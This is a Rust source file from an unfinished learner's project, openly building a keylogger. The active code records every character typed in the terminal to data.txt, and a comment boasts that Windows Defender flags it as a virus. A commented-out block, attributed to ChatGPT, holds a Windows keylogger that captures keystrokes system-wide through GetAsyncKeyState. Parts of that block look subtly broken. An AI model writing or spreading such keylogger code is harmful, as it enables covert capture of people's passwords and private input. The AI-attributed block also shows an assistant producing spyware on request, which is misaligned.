/* Este es un proyecto sin acabar que he creado para aprender Rust. Si tienes conocimientos del lenguaje, y algo de tiempo,
agradecería que mejoraras este proyecto o me dieras sugerencias. Eso me ayudaría mucho a mejorar :D

This is an unfinished project created to learn Rust. If you have knowledge of the language and some time,
I would appreciate it if you could improve this project or give suggestions. That would help me a lot to improve :D
*/

/*Windows defender ya lo detecta como virus :D */


#[macro_use]
extern crate crossterm;
use crossterm::cursor;
use crossterm::terminal::{Clear, ClearType};
use std::io::stdout;
use console::Term;


use std::fs::File;
use std::io::Write;


//////////////////////////Librerías para ejecutar en background y multithread
//use tokio::time::sleep;
//use std::thread::spawn;
//use std::thread;



//fn execute_in_background() {}

fn clear_screen() {
    let mut stdout = stdout();
    execute!(stdout, Clear(ClearType::All), cursor::MoveTo(0, 0)).unwrap();
}

fn read_character() {
    let mut data_file = File::create("data.txt").expect("creation failed");
    let stdout = Term::buffered_stdout();
    
    loop {
        if let Ok(character) = stdout.read_char() {
            data_file.write(character.to_string().as_bytes()).expect("write failed");
        }
    }
}

fn main() {
    clear_screen();
    read_character();
}


/*SOLUCION CHATGPT          (USA WINAPI PARA INTERACTUAR CON EL SISTEMA OPERATIVO WINDOWS)

extern crate winapi;

use std::ptr::null_mut;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::thread;
use std::time::Duration;

use winapi::um::winuser::{GetAsyncKeyState, MapVirtualKeyW, VK_BACK, VK_RETURN, VK_SHIFT, VK_CAPITAL};

fn get_key_name(key: i32) -> String {
    unsafe {
        let scan_code = MapVirtualKeyW(key as u32, 0) as u16;
        let mut buf = [0; 2];
        let len = winapi::um::winuser::ToUnicode(key as u32, scan_code, null_mut(), buf.as_mut_ptr(), 2, 0);
        if len == 1 {
            let wide_char = buf[0] as u32;
            let os_string = OsStr::from_wide(&[wide_char]);
            if let Some(key) = os_string.to_str() {
                return key.to_string();
            }
        }
        format!("VK_{}", key)
    }
}

fn main() {
    println!("Iniciando keylogger (presiona Esc para salir)...");
    
    loop {
        thread::sleep(Duration::from_millis(10));
        
        for key in 8..256 {
            let state = unsafe { GetAsyncKeyState(key) };
            if state != 0 && key != VK_RETURN && key != VK_SHIFT && key != VK_CAPITAL {
                let key_name = get_key_name(key);
                println!("{}", key_name);
            }
        }
        
        // Detecta la tecla Escape para salir del bucle
        let state = unsafe { GetAsyncKeyState(winapi::um::winuser::VK_ESCAPE) };
        if state != 0 {
            println!("Saliendo del keylogger...");
            break;
        }
    }
}

*/
